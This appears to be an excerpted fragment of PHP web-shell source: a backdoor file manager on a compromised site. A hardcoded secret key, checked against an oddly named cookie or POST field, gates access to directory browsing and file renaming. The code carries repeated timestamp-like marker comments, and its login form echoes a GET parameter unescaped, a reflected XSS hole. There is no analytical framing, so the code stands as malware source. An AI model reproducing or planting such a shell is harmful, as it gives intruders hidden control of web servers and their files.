...
$auth_key = "17caad485b3d28ca5fd71113ec8452e6";
...
$pass = false;
if (isset($_COOKIE['pw_name_35721'])) {
    if(($_COOKIE['pw_name_35721']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_35721'])) {
        if(($_POST['pw_name_35721']) == $auth_key) {
            setcookie("pw_name_35721", $_POST['pw_name_35721']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_35721' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725121105235007 1725121105382378 1725121105466368 1725121105369647
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725121105235007 1725121105382378 1725121105466368 1725121105369647
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725121105235007 1725121105382378 1725121105466368 1725121105369647
            $name = PATH . "/" . $_GET['r'];
